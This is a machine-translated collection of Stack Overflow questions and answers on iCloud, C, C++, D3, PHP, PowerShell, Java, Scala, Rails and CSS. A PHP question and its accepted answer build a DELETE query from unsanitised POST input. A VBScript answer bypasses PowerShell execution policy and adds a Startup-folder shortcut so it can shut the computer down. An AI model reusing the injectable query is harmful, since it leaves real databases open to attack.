使用 iCloud，我正在通过用户的所有 Apple 设备同步我的应用程序数据。问题是用户可以自己创建一个警报，我想这样做，如果用户在 iPad 中创建通知，他也会在 iPhone 中收到通知，而无需在 iPhone 中打开应用程序（同步iCloud 更改）。我希望 iCloud 在后台同步，仅用于通知。

此外，当用户收到通知并在他的 iPad 中打开应用程序时，该通知应该从他所有其他 Apple 设备中删除，它不应该在通知中心看到。

这甚至可能吗？非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T00:27:56.977

假设应用程序尚未在 iPhone 上运行，iPad 上的应用程序向 iPhone 发送通知的唯一方法是应用程序调用服务器，该服务器将向 iPhone 发送 APNS 通知.

至于删除通知，您可以控制本地通知，但不能控制远程通知。我不相信 APNS 有任何方法可以从其他设备中删除通知。

# c - C 指针地址的细微差别

> ID：15845501
> 
> 赞同：0
> 
> 时间：2013-04-06T00:07:18.657
> 
> 标签：c, pointers, bit

有什么区别：

```
*((uint32_t*)(p) + 4);
*(uint32_t*)(p+4); 
```

或者价值甚至有差异？

我的直觉是，在后面的示例中，值从 p 指向的数组的第 4 个索引开始，并从索引 4 开始获取前 4 个字节。而在第一个示例中，它每 4 个索引占用一个字节。这种直觉正确吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T00:17:45.137

该`p+4`表达式通过将`4*sizeof(*p)`字节添加到 的值来计算地址`p`。如果 的大小与 的大小`*p`相同`uint32_t`，则这两个表达式的结果没有区别。

鉴于

> `p`是一个`int`指针

并假设`int`您的系统是 32 位的，您的两个表达式会产生相同的结果。

# c++ - 如何在当前时间的打印输出中获得更高的精度（几分之一秒）？

> ID：15845505
> 
> 赞同：7
> 
> 时间：2013-04-06T00:08:02.770
> 
> 标签：c++, time

我尝试了几种方法来打印时间，`system_clock`但除了整秒之外我什么也得不到：

```
system_clock::time_point now = system_clock::now();
std::time_t now_c = system_clock::to_time_t(now);

std::cout<<ctime(&now_c);
std::cout<<std::put_time(std::localtime(&now_c), "%T")<<" "; 
```

该`now()`函数是否实际上保存了高精度数据，或者我只是找不到提取该信息进行打印的函数？

注意：我不想计算时间间隔。我想要几分之一秒的*当前时间*`cout`，并通过. 我只是找不到办法做到这一点。

而且我知道`std::chrono::high_resolution_clock`但也没有办法打印出它的`now()`. 此外，该`setprecision`函数对`put_time`or的输出没有影响`ctime`。

我得到的答案实际上并没有解决这个问题。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-06T02:04:53.227

您可以执行以下操作：

```
#include <chrono>
#include <ctime>
#include <iostream>
#include <string>

std::string GetLocalTime() {
  auto now(std::chrono::system_clock::now());
  auto seconds_since_epoch(
      std::chrono::duration_cast<std::chrono::seconds>(now.time_since_epoch()));

  // Construct time_t using 'seconds_since_epoch' rather than 'now' since it is
  // implementation-defined whether the value is rounded or truncated.
  std::time_t now_t(
      std::chrono::system_clock::to_time_t(
          std::chrono::system_clock::time_point(seconds_since_epoch)));

  char temp[10];
  if (!std::strftime(temp, 10, "%H:%M:%S.", std::localtime(&now_t)))
    return "";

  return std::string(temp) +
      std::to_string((now.time_since_epoch() - seconds_since_epoch).count());
}

int main() {
  std::cout << GetLocalTime() << '\n';
  return 0;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-03-03T21:30:07.323

现有答案很好，但它错过了秒的小数部分的前导零，因此 21:10:30.01 将返回为 21:10:30.1

我没有代表发表评论，我的编辑被拒绝，所以这是一个固定版本：

```
#include <chrono>
#include <ctime>
#include <iostream>
#include <string>

std::string GetLocalTime() {
  auto now(std::chrono::system_clock::now());
  auto seconds_since_epoch(
    std::chrono::duration_cast<std::chrono::seconds>(now.time_since_epoch()));

  // Construct time_t using 'seconds_since_epoch' rather than 'now' since it is
  // implementation-defined whether the value is rounded or truncated.
  std::time_t now_t(
    std::chrono::system_clock::to_time_t(
      std::chrono::system_clock::time_point(seconds_since_epoch)));

  char temp[10];
  if (!std::strftime(temp, 10, "%H:%M:%S.", std::localtime(&now_t)))
    return "";

  std::string nanoseconds = std::to_string(
    (std::chrono::duration<long long, std::nano>(
      now.time_since_epoch() - seconds_since_epoch)).count());

  return std::string(temp) + std::string(9-nanoseconds.length(),'0') + nanoseconds;
}

int main() {
  std::cout << GetLocalTime() << '\n';
  return 0;
} 
```

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2013-04-06T00:23:50.150

尝试[std::chrono::high_resolution_clock](http://www.cplusplus.com/reference/chrono/high_resolution_clock/)。（我认为它只有 c++11）

# d3.js - D3 过渡 - 暂停和恢复

> ID：15845506
> 
> 赞同：8
> 
> 时间：2013-04-06T00:08:03.640
> 
> 标签：d3.js, transition

我试图从本[指南](http://xaedes.de/dev/transitions/)中了解 D3 转换的“暂停”和“恢复” 。虽然我了解“暂停”是如何工作的，但在“恢复”方面我几乎没有迷失。我无法理解作者的解释，特别是“线性”或**第一次简历解释**。我的问题是到底在`e.attr("T",0);`做`.attr("T",1);`什么？

我在这里将恢复功能应用于视频或波形示例的播放头：[jsfiddle](http://jsfiddle.net/evanemolo/WV3Pv/)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-06T11:09:14.610

所选节点的代码`e.attr("T",0)`和`.attr("T",1)`设置属性。即，创建并设置新属性“T”。这样做的目的纯粹是为了方便停止和恢复——0 表示开始前的转换，1 表示结束。

如果transition中包含这个属性，值会逐渐从0变为1。正如教程作者指出的，这可以用来获取transition在任意时间点的状态——你只需要查询“T”的值。如果您还保存了特定的转换，您可以使用该值在任何时候暂停和恢复。

请注意，“T”没有什么特别之处。您可以使用任何（未使用的）属性名称。目的只是为了有某种方式来说明过渡的进展情况。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-08T18:49:43.637

我也一直在努力解决这个确切的问题，我认为这个例子中有一个错字让我失望。作者写道：

```
var e = d3.select("#time");
e.attr("T",0);

c.transition()
    .duration( time )
    .ease( "linear" )
    .attr("T",1); 
```

似乎`e`将其`T`属性更新为`c`转换，这是没有意义的。相反，我认为应该如下：

```
var e = d3.select("#time");
e.attr("T",0);

e.transition()
    .duration( time )
    .ease( "linear" )
    .attr("T",1); 
```

现在我们选择`#time`元素，将其`T`属性的初始值设置为，`0`然后将过渡添加到在指定持续时间内更改为的同一元素`e`（而不是）。`c``T``1`

# php - 返回真或假以及如何在循环中获得真

> ID：15845507
> 
> 赞同：-1
> 
> 时间：2013-04-06T00:08:13.193
> 
> 标签：php, jquery

我有这个脚本通过 $.post 发送一些信息

```
$("#clickme").click(function(e){  
var selected = $(".img input:checked").map(function(i,el){return el.name;}).get();
var prelucrare = selected.join(";")
$.post('test.php', {
    rezultat: prelucrare,    
},

function(data){
    $('#rez').html(data)
});  
});` 
```

以及处理 $.post 的 PHP 文件

```
<?php
require_once '../config.php';
If(isSet($_POST['rezultat'])) {
$d = explode(';', $_POST['rezultat']);

foreach($d as $numar_inregistrare){
    $SQL = "DELETE FROM galerie_foto WHERE numar_inregistrare = '$numar_inregistrare'";
    $rezultat = mysql_query($SQL) or die(mysql_error());

    return true;          
}
} else {
exit;
}
?> 
```

我有两个问题： 1.如果返回值为 true ，如何让 js 脚本做一件事，如果返回值为 false ，如何让 js 脚本做一件事？像这样的东西？

```
 $.post('test.php', {
  rezultat: prelucrare,
       success: function(msg){
        valid = (msg == 1) ? true : false;
        if(!valid) {
            $("#valid_input").html("Please enter valid info");
        } else {
            $("#valid_input").html("");
        }
     }
   )}; 
```

1.  我的另一个问题是关于返回结果，因为如果数组中有 3 个东西，结果将是 truetruetrue 而不是只有一个 true，我处于一个循环中，我该怎么做才能得到一个 true ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:28:27.383

您只能在函数和方法中使用“return”。要打印一次“true”或“false”，您可以在 foreach 循环中中断，或者在您的情况下，如果出现错误，只需退出“false”即可。你会有这样的东西：

```
foreach($d as $numar_inregistrare){
    $SQL = "DELETE FROM galerie_foto WHERE numar_inregistrare = '$numar_inregistrare'";
    $rezultat = mysql_query($SQL);

    if (!$rezultat) {
        exit('false');
    }
}

echo 'true';

.... 
```

# powershell - 获取机器空闲时间

> ID：15845508
> 
> 赞同：21
> 
> 时间：2013-04-06T00:08:31.803
> 
> 标签：powershell

有没有办法使用 Powershell 或批处理文件来获取机器的空闲时间，例如机器未使用的时间，以分钟/小时为单位？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-04-06T04:09:14.187

这是一个使用 Win32 API [GetLastInputInfo](http://msdn.microsoft.com/en-us/library/windows/desktop/ms646302(v=vs.85).aspx)的 PowerShell 解决方案。

```
Add-Type @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PInvoke.Win32 {

    public static class UserInput {

        [DllImport("user32.dll", SetLastError=false)]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [StructLayout(LayoutKind.Sequential)]
        private struct LASTINPUTINFO {
            public uint cbSize;
            public int dwTime;
        }

        public static DateTime LastInput {
            get {
                DateTime bootTime = DateTime.UtcNow.AddMilliseconds(-Environment.TickCount);
                DateTime lastInput = bootTime.AddMilliseconds(LastInputTicks);
                return lastInput;
            }
        }

        public static TimeSpan IdleTime {
            get {
                return DateTime.UtcNow.Subtract(LastInput);
            }
        }

        public static int LastInputTicks {
            get {
                LASTINPUTINFO lii = new LASTINPUTINFO();
                lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
                GetLastInputInfo(ref lii);
                return lii.dwTime;
            }
        }
    }
}
'@ 
```

以及一个示例用法：

```
for ( $i = 0; $i -lt 10; $i++ ) {
    Write-Host ("Last input " + [PInvoke.Win32.UserInput]::LastInput)
    Write-Host ("Idle for " + [PInvoke.Win32.UserInput]::IdleTime)
    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2020-09-12T01:43:56.100

此 vbscript 代码的灵感来自已回答的问题，向您展示了我们如何在空闲超时后使用它来自动关闭您的工作站！

***Auto-Shutdown_On_Idle_TimeOut.vbs***

* * *

```
'##########################################################################################################################
'# Auto-Shutdown your workstation after Idle Timeout                                                                      #
'# Script Name : Auto-Shutdown_On_Idle_TimeOut.vbs                                                                        #
'# Arrêt automatique de votre poste de travail après le délai d'inactivité                                                #
'# Idea comes from here ==>  This snippet is from http://stackoverflow.com/a/15846912                                     #
'# https://stackoverflow.com/questions/15845508/get-idle-time-of-machine/15846912#15846912                                #
'# https://gist.github.com/wendelb/1c364bb1a36ca5916ca4 ===> Auto-Lock your workstation after Idle-Timeout with PowerShell#
'##########################################################################################################################
Option Explicit
Dim Copyright,Msg,MsgEN,MsgFR
Copyright = "Auto-Shutdown your workstation after Idle Timeout " & ChrW(169) &" Hackoo 2020"

MsgEN = Array("ATTENTION ! There is another instance running !",_
"Save your Work because the computer will shutdown in 60 seconds")

MsgFR = Array("ATTENTION ! Il y a une autre instance en cours d'exécution !",_
"Sauvegarder votre Travail car l'ordinateur va s'éteindre dans 60 secondes")

If AppPrevInstance() Then 
    If Oslang = 1036 Then
        Msg = MsgFR(0) 
    Else
        Msg = MsgEN(0)
    End If
    MsgBox Msg & VbCrLF & CommandLineLike(WScript.ScriptName),VbExclamation,Copyright
    WScript.Quit   
Else 
    Dim Timeout_Idle,strCommand,VbsPath,ShortcutName
    If Oslang = 1036 Then
        Msg = MsgFR(1) 
    Else
        Msg = MsgEN(1)
    End If
    Timeout_Idle = "60"  '60 Minutes = 1 Heure = 1 Hour
    strCommand = "Shutdown.exe -s -t 60 -c " & DblQuote(Msg)
    VbsPath = Wscript.ScriptFullName
    ShortcutName = "Auto-Shutdown_On_Idle_TimeOut"
    Call Shortcut(VbsPath,ShortcutName)
    Call Write_Run_PScript(Timeout_Idle,strCommand)
End If
'---------------------------------------------------------------------------------------------------------------
Sub Shortcut(PathApplication,ShortcutName)
    Dim objShell,StartFolder,objShortCut,MyTab
    Set objShell = CreateObject("WScript.Shell")
    MyTab = Split(PathApplication,"\")
    If ShortcutName = "" Then
        ShortcutName = MyTab(UBound(MyTab))
    End if
    StartFolder = objShell.SpecialFolders("Startup")
    Set objShortCut = objShell.CreateShortcut(StartFolder & "\" & ShortcutName & ".lnk")
    objShortCut.TargetPath = DblQuote(PathApplication)
    ObjShortCut.IconLocation = "%SystemRoot%\system32\SHELL32.dll,27"
    objShortCut.Save
End Sub
'---------------------------------------------------------------------------------------------------------------
Function DblQuote(Str)
    DblQuote = Chr(34) & Str & Chr(34)
End Function
'---------------------------------------------------------------------------------------------------------------
Sub Write_Run_PScript(Timeout_Idle,strCommand)
    Const ForWriting = 2
    Dim fs,Ws,ts,Ret,PSFile,ByPassPSFile
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set Ws = CreateObject("WScript.Shell")
    PSFile = Ws.ExpandEnvironmentStrings("%Temp%") & fs.GetTempName & ".ps1"
    ByPassPSFile = "PowerShell -ExecutionPolicy bypass -noprofile -file "
    Set ts = fs.OpenTextFile(PSFile,ForWriting,True)
    ts.WriteLine "$idle_timeout = New-TimeSpan -Minutes "& Timeout_Idle &""
    ts.WriteLine "Add-Type @'"
    ts.WriteLine "using System;"
    ts.WriteLine "using System.Diagnostics;"
    ts.WriteLine "using System.Runtime.InteropServices;"
    ts.WriteLine "namespace PInvoke.Win32 {"
    ts.WriteLine "    public static class UserInput {"
    ts.WriteLine "        [DllImport(""user32.dll"", SetLastError=false)]"
    ts.WriteLine "        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);"
    ts.WriteLine "        [StructLayout(LayoutKind.Sequential)]"
    ts.WriteLine "        private struct LASTINPUTINFO {"
    ts.WriteLine "            public uint cbSize;"
    ts.WriteLine "            public int dwTime;"
    ts.WriteLine "        }"
    ts.WriteLine "        public static DateTime LastInput {"
    ts.WriteLine "            get {"
    ts.WriteLine "                DateTime bootTime = DateTime.UtcNow.AddMilliseconds(-Environment.TickCount);"
    ts.WriteLine "                DateTime lastInput = bootTime.AddMilliseconds(LastInputTicks);"
    ts.WriteLine "                return lastInput;"
    ts.WriteLine "            }"
    ts.WriteLine "        }"
    ts.WriteLine "        public static TimeSpan IdleTime {"
    ts.WriteLine "            get {"
    ts.WriteLine "                return DateTime.UtcNow.Subtract(LastInput);"
    ts.WriteLine "            }"
    ts.WriteLine "        }"
    ts.WriteLine "        public static int LastInputTicks {"
    ts.WriteLine "            get {"
    ts.WriteLine "                LASTINPUTINFO lii = new LASTINPUTINFO();"
    ts.WriteLine "                lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));"
    ts.WriteLine "                GetLastInputInfo(ref lii);"
    ts.WriteLine "                return lii.dwTime;"
    ts.WriteLine "            }"
    ts.WriteLine "       }"
    ts.WriteLine "    }"
    ts.WriteLine "}"
    ts.WriteLine "'@"
    ts.WriteLine "$locked = 0;"
    ts.WriteLine "Do {"
    ts.WriteLine "  $idle_time = [PInvoke.Win32.UserInput]::IdleTime;"
    ts.WriteLine "  if (($locked -eq 0) -And ($idle_time -gt $idle_timeout)) {"
    ts.WriteLine "      "&strCommand&""
    ts.WriteLine "      $locked = 1;"
    ts.WriteLine "  }"
    ts.WriteLine "  if ($idle_time -lt $idle_timeout) {"
    ts.WriteLine "      $locked = 0;"
    ts.WriteLine "  }"
    ts.WriteLine "    Start-Sleep -Seconds 10"
    ts.WriteLine "}"
    ts.WriteLine "while (1 -eq 1)"
    ts.Close
    Ret = Ws.run(ByPassPSFile & PSFile,0,True)
End sub
'----------------------------------------------------------------------------------------------------------------
Function AppPrevInstance()   
    With GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")   
        With .ExecQuery("SELECT * FROM Win32_Process WHERE CommandLine LIKE " & CommandLineLike(WScript.ScriptFullName) & _
            " AND CommandLine LIKE '%WScript%' OR CommandLine LIKE '%cscript%'")   
            AppPrevInstance = (.Count > 1)   
        End With   
    End With   
End Function    
'----------------------------------------------------------------------------------------------------------------
Function CommandLineLike(ProcessPath)   
    ProcessPath = Replace(ProcessPath, "\", "\\")   
    CommandLineLike = "'%" & ProcessPath & "%'"   
End Function
'----------------------------------------------------------------------------------------------------------------
Function OSLang()
    Dim dtmConvertedDate,strComputer,objWMIService,oss,os
    Set dtmConvertedDate = CreateObject("WbemScripting.SWbemDateTime")
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
    Set oss = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
    For Each os in oss
        OSLang = os.OSLanguage
    Next
End Function
'---------------------------------------------------------------------------------------------------------------- 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-08T04:20:38.537

```
$Last = [PInvoke.Win32.UserInput]::LastInput
$Idle = [PInvoke.Win32.UserInput]::IdleTime
$LastStr = $Last.ToLocalTime().ToString("MM/dd/yyyy hh:mm tt")
Write-Host ("Last user keyboard/mouse input: " + $LastStr)
Write-Host ("Idle for " + $Idle.Days + " days, " + $Idle.Hours + " hours, " + $Idle.Minutes + " minutes, " + $Idle.Seconds + " seconds.") 
```

试试这个 - 虽然远程运行它可能在不同的会话上运行，因此有不同的空闲时间？

# java - 泛型和字段如何协助独立 Java 应用程序中的 DAO 模式

> ID：15845509
> 
> 赞同：2
> 
> 时间：2013-04-06T00:08:45.703
> 
> 标签：java, design-patterns, generics, dao, dto

```
//Interface DAO

    public abstract class BaseDAO<T extends BaseDTO> {

    public void update(T t) throws DBException {
     Field[] fieldsToInsert = t.getClass().getDeclaredFields();
    //code to update database object academic or event
    }

     public Integer create(T t) throws DBException {
      Field[] fieldsToInsert = t.getClass().getDeclaredFields();
    //code to create academic or event in database
    }

} 

//Concrete DAOs
public class AcademicDAO extends BaseDAO<AcademicDTO> {
//provide implementation
}

public class EventDAO extends BaseDAO<EventDTO> {
//provide implementation
}

//Transfer object
public class AcademicDTO extends BaseDTO {
   String title;
   String surname;
   //getters and setters
}

public class BaseDTO {

    protected Integer ID;

    public Integer getID() {
        return ID;
    }

    public void setID(Integer ID) {
        this.ID = ID;
    }
} 
```

大家好，我有一个示例代码，它遵循上述结构来创建一个小型 Java 应用程序来管理学术和活动。它宽大地遵循这种[模式](http://www.oracle.com/technetwork/java/dataaccessobject-138824.html)

1-你们专家比我更熟悉这种模式。我想了解为什么在这种情况下使用泛型，以便 DAO 可以扩展和实现泛型基类。如果能用一个例子来说明泛型在这里的优势是多么的好，那就太好了。

2 - 我也见证了java Fields的使用。泛型和字段之间有联系吗？

我想在学术报告中记录 DAO 模式，但我发现很难理解*泛型*和*反射场*如何在这里发挥作用。它们是否支持灵活性和松散耦合？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:39:45.393

您提供的代码是一组可重用的加载和持久化实体的逻辑。很多时候，在一个非平凡大小的应用程序中，您最终会持久化许多不同类型的对象。在此示例中，您可以根据需要定义任意数量的对象，但只定义实际保存和加载一次的逻辑。通过询问 DTO`Field`那里有哪些对象，它可以获取数据以帮助构建用于加载和保存的查询。

泛型允许您在保持类型安全的同时使用此模式。 `AcademicDAO`只能处理`AcadmeicDTO`。你不能`AcademicDAO`用来存储`EventDTO`。`Field`泛型允许类的实例在处理对象时依赖更具体的类型。如果您没有泛型，`BaseDAO`则将采用`Object`，并且您将无法访问除 Object 提供的方法之外的任何方法，因为 JVM 不知道提供了什么类，因此它必须将其知识限制为`Object`. 使用`getClass().getDeclaredFields()`绕过该限制，因为`getClass()`返回参数的实际类`Object`。

`Field`只是一种使用反射来访问每个 DTO 中的属性值的方法。如果您必须使用 直接访问字段，则`getTitle()`无法重用通用基类来进行持久化。当您需要访问 EventDTO 时会发生什么？您必须为此提供逻辑。 `Field`允许您跳过该逻辑。

**编辑：**

为了解释我所说的访问的意思`getID`，您可以在其中执行以下操作，`BaseDAO`因为`T`已知a 定义`BaseDTO`了一个`getID()`方法：

```
public abstract class BaseDAO<T extends BaseDTO> {

    public boolean update(T t) throws DBException {
        Integer id = t.getID();
        Field[] fields = t.getClass().getDeclaredFields();
        // Assuming you have a db object to execute queries using bind variables:
        boolean success = db.execute("UPDATE table SET ... WHERE id = ?", id.intValue());
        return success;
    }
} 
```

如果你有这个（在非泛型类中）：

```
public boolean update(Object o) throws DBException {
    // This line doesn't work, since Object doesn't have a getID() method.
    Integer id = t.getID();
    Field[] fields = o.getClass().getDeclaredFields();

    boolean success = db.execute("UPDATE table SET ... WHERE id = ?", id.intValue());
    return success;
} 
```

您必须查看这些`Field`对象，或者询问 ID 字段并假设它存在。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T00:40:02.053

对于问题 1。无论 DTO 的类型如何，泛型的使用都允许使用`update`和使用相同的实现。`create`考虑一下你是否没有使用泛型。那么你可以为参数类型做的最好的事情`update`就是`BaseDTO`，但是你可以调用

```
academicDAO.update( eventDTO ) 
```

这是没有意义的。使用您拥有的代码，这将是一个类型错误。所以主要优点是：更好的类型检查。

对于问题 2。 Fields 的使用允许单个实现`update`和`create`处理各种具体类型的 DTO 对象。

# scala - 排除行为的首选方法是什么

> ID：15845511
> 
> 赞同：2
> 
> 时间：2013-04-06T00:08:53.117
> 
> 标签：scala, coding-style, refactoring

假设我有几个类在内部共享一些行为，例如

```
def workspace = Plugin.get.reallyGet.getWorkspace 
```

将其分解的最佳方法是什么？我看到了两种可以在 using 代码中等效使用的可能性。

```
trait WorkspaceProvider {
  def workspace = Plugin.get.reallyGet.getWorkspace
} 
```

并将其混合或

```
object WorkspaceProvider {
  def workspace = Plugin.get.reallyGet.getWorkspace
} 
```

并导入它。你更喜欢什么，为什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T02:03:39.243

前者更可取。后者本质上是静态的、不可模拟的并且难以测试。

由于您正在考虑耦合（一件非常好的事情），您应该熟悉蛋糕模式（它在 'Net 上有很多介绍，从首次描述该概念的[论文开始）。](http://lampwww.epfl.ch/~odersky/papers/ScalableComponent.pdf)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T07:44:20.460

您可以同时定义：

```
trait WorkspaceProvider {
  def workspace = Plugin.get.reallyGet.getWorkspace
}

object WorkspaceProvider extends WorkspaceProvider 
```

第一种形式更灵活。例如，它允许在实例化时混合：

```
trait Foo { this:WorkspaceProvider =>
   def bar = workspace.doSomethingRelevantHere
}

val myFoo = new Foo with WorkspaceProvider 
```

但是如果你只是想使用该`workspace`方法，第二种形式更方便。例如在测试、原型等中。

**编辑：**

有关此方法的更多详细信息，请查看[“Selfless Trait Pattern”](http://www.artima.com/scalazine/articles/selfless_trait_pattern.html)，其中 Bill Venners 展示了它是如何在 ScalaTest 中实现的。

# xcode - 在 iCloud 上保存数据

> ID：15845513
> 
> 赞同：-1
> 
> 时间：2013-04-06T00:09:03.540
> 
> 标签：xcode, icloud, save, uidocument

我已经能够将 plist 与所有用户的高分同步到 iCloud。

我仍然无法弄清楚如何制作它，因此人们不能只进入 iCloud 文档文件夹并更改这些值。

我知道 Jetpack Joyride 将他们的游戏信息保存到 iCloud，但是当我进入文档文件夹时，里面什么都没有（他们将其保存到自己的服务器吗？）

我用“Game.sav”文件保存的另一个游戏。

iCloud中是否有用户无法访问的文件夹？如果他们可以更改 Game Center 的高分或成就数字，那将毁掉游戏。

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T00:24:56.597

代替 iCloud 的文档保存功能，使用 iCloud 的键值功能（NSUbiquitousKeyValueStore）。用户看不到这一点。

# ruby-on-rails - 将模型的路径重定向到 Rails 中的不同路径

> ID：15845517
> 
> 赞同：1
> 
> 时间：2013-04-06T00:09:51.353
> 
> 标签：ruby-on-rails

假设我的 routes.rb 中有以下内容：

```
resources :universes do
    resources :planets
end 
```

这将创建一个方法，`universe_planet_path(universe, planet)`. 但是，行星对象知道它属于哪个宇宙，所以我想要一个`planet_path(planet)`可以返回与`universe_planet_path(planet.universe, planet)`. 我应该把这样的功能放在哪里，比如说，`form_for @planet`可以访问它，或者有更好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:20:50.520

要回答问题的第一部分，您可以在 application_helper 中创建如下函数：

```
def planet_path(planet)
    universe_planet_path(planet.universe, planet)
end 
```

虽然不确定这`form_for`部分，这有点棘手。

# c++ - 从文件读取时如何跳过数组的第一行？

> ID：15845518
> 
> 赞同：1
> 
> 时间：2013-04-06T00:10:01.220
> 
> 标签：c++

我正在尝试从文本文件中读取值，然后将它们粘贴到数组中。我正在使用的文本文件是这样的；

```
Big Stone Gap,VA
Red-tailed_Hawk     1              
Mourning_Dove       66              
Red-bellied_Woodpecker  5              
Yellow-bellied_Sapsucker 1             
Downy_Woodpecker    4              
Pileated_Woodpecker     2              
Blue_Jay        8              
American_Crow       89             
Carolina_Chickadee      8              
Black-capped_Chickadee  6              
Tufted_Titmouse     12             
Red-breasted_Nuthatch   2              
White-breasted_Nuthatch  9             
Carolina_Wren       3              
American_Robin      1              
Northern_Mockingbird    1              
European_Starling   5              
Eastern_Towhee      3              
Field_Sparrow       13            
Fox_Sparrow         1              
Song_Sparrow        8              
White-throated_Sparrow  11            
Dark-eyed_Junco     9             
Northern_Cardinal   30            
Purple_Finch        7              
House_Finch         6             
American_Goldfinch      29 
```

我正在尝试将它们读入一个数组，然后输出该数组。我必须做其他事情，（改变用户输入的值），但我知道该怎么做。我的问题是这个；当我运行它时，它会读取`Big`and `Stone`，并将它们放入值中。这不是我想要的；它应该类似于`Red_Tailed_Hawk`and `1`。我在下面有我的代码；我不知道该怎么做才能让它正常工作。请原谅一些变量；我从另一个使用 int 数组而不是字符串数组的项目中蚕食了这个脚本。

```
#include <iostream>
#include <fstream>
#include <iomanip>

using namespace std;

const int NUMBER_OF_STUDENTS = 28;
const int NUMBER_OF_SCORES = 28;

void getData (ifstream& infile, string matrix[][NUMBER_OF_SCORES + 1 ],
                    int NUMBER_OF_STUDENTS) ;

void printMatrix(string matrix[][NUMBER_OF_SCORES + 1], int NUMBER_OF_STUDENTS);

int main()
{
string birdarray [NUMBER_OF_STUDENTS][NUMBER_OF_SCORES +1 ] ;
              // column 0 will hold the student ID.
              // row n has the ID and birdarray for student n.

ifstream inData; //input file stream variable
inData.open("one.txt");

if ( !inData)
{
     cout << "invalid file name \n";

     return 1;
}

// input the birdarray into two-D array birdarray
getData ( inData , birdarray, NUMBER_OF_STUDENTS );
printMatrix(birdarray, NUMBER_OF_STUDENTS);

// return  the row number of a searchItem in a particular column.
// if not found, return -1
}

void getData (ifstream& infile,string chart[][NUMBER_OF_SCORES + 1 ],
                    int student_count)

{
 int row, col;

 for ( row = 0; row < student_count; row++)
    for (col =0; col <  NUMBER_OF_SCORES +1  ; col++)
        infile  >> chart [row] [col] ;

}
void printMatrix(string matrix[][NUMBER_OF_SCORES + 1], int NUMBER_OF_STUDENTS)
{
int row, col;
//this code below is to loop it so it displays all the values
// for (row = 0; row < NUMBER_OF_STUDENTS + 1; col++)
// {
//   cout << right << matrix[row][col];
 //  cout << endl;
//}

//this is just some test code to see if it can output certain values right
cout << matrix[0][2];
cout << matrix[0][3];
cout << matrix[0][4];
cout << matrix[0][5];
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-08-02T01:26:51.367

您可以使用以下内容跳过第一行：

```
inData.ignore(numeric_limits<streamsize>::max(), inData.widen('\n')); 
```

std::istream::ignore 参考：[http ://www.cplusplus.com/reference/istream/istream/ignore/](http://www.cplusplus.com/reference/istream/istream/ignore/)

PS。第一个参数是要忽略的最大字符数。numeric_limits::max() 表示您要忽略直到字符串结束，无论字符串有多长。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T00:16:42.553

这里有一个答案： [How do I read a text file from the second line using fstream?](https://stackoverflow.com/questions/164344/how-do-i-read-a-text-file-from-the-second-line-using-fstream)

在进行 getData 调用之前，只需阅读第一行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T00:14:40.713

```
string line;     
getline(infile, line)
for ( row = 0; row < row_count; row++)
        for (col =0; col <  column_count +1  ; col++)
            getline(infile, line);
            chart[row][col] = line; 
```

流的行为与其同名。您不能像跳过数组一样跳过流中的内容，您所能做的就是忽略漂浮的内容。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-06T00:47:39.593

您可以使用 seekg() 函数将 FPM（即文件位置标记）移动到您想要的任何空间量。这可能是最简单的方法。

从你的代码来看，它看起来像

```
inData.seekg(16, std::ios::beg) //Seeks past 16 character in the file 
```

# css - 在响应式设计中将图像大小调整为 100%

> ID：15845522
> 
> 赞同：0
> 
> 时间：2013-04-06T00:10:26.593
> 
> 标签：css, image, responsive-design

我有一个 WordPress 网站，其儿童主题为 212。本页底部有一张红狮酒店的图片：[http ://ranchocordovaeventscenter.com/partner-hotels/](http://ranchocordovaeventscenter.com/partner-hotels/)

它会自动调整大小以填充它所在的表的 100%。我尝试将它添加到表之外，它做同样的事情。如果我更改图像，它也会这样做。

这是HTML：

```
<a target="_blank" href="http://www.redlion.com/our-hotels/california/rancho-cordova/">
<img class="size-full wp-image-423 alignleft" width="150" height="169" src="http://ranchocordovaeventscenter.com/wp-content/uploads/2013/01/redlion.jpg" alt="Red Lion Hotel" title="Red Lion Hotel">
</a> 
```

以及适用的 CSS：

```
img {
    border: 0 none;
    max-width: 540px;
    width: 100%;
} 
```

我知道我将其设置为 width: 100% 但是当网站针对较小的设备调整大小时，较大的图像将保留在屏幕内。

任何提示将不胜感激，谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T00:21:10.590

将其从宽度更改为最大宽度：

```
img {
    max-width: 100%;
} 
```

这应该够了吧。

# matlab - 如何在 Matlab 中使用 newff 选择输入层、隐藏层和输出层的数量？

